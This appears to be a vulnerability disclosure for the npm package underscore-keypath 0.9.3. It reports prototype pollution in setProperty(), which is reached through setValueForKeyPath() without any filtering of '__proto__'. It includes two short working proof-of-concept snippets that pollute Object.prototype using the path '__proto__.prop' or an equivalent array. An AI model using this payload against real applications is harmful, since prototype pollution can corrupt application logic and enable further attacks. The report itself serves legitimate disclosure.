|  | 1、Affected module |
| --- | --- |
|  | the prototype pollution is affected the “underscore-keypath@0.9.3 ” |
|  | key-path mechanism extensions for underscore (mixin). |
|  | underscore-keypath let you access JavaScript objects and arrays with keypath easily. |
|  | 2、relevant package manager/ecosystem |
|  | NPM ecosystem |
|  | 3、vulnerability details |
|  | prototype pollution vulnerability in function setProperty() in underscore-keypath.js in underscore-keypath@0.9.3 |
|  | the function setProperty() :line 162 obj[name] = value is the point of prototype pollution |
|  | 4、steps to reproduce |
|  | the entry function is setValueForKeyPath(), the function doesn't judge the arguments like“\_\_proto\_\_” ，pass the bad input like “\_\_proto\_\_” into the function，and then into the setProperty() function，lead to the prototype pollution. |
|  | var underscore =require("underscore-keypath") |
|  | //the first POC |
|  | // BAD\_ARRAY2 = ['\_\_proto\_\_', 'prop'] |
|  | // console.log("Before: "+{}.prop) |
|  | // underscore.setValueForKeyPath({},BAD\_ARRAY2,"polluted") |
|  | // console.log("After: "+{}.prop) |
|  |  |
|  | //the second POC |
|  | console.log("Before: "+{}.prop) |
|  | BAD\_path = "\_\_proto\_\_.prop" |
|  | underscore.setValueForKeyPath({},BAD\_path,"polluted") |
|  | console.log("After: "+{}.prop) |
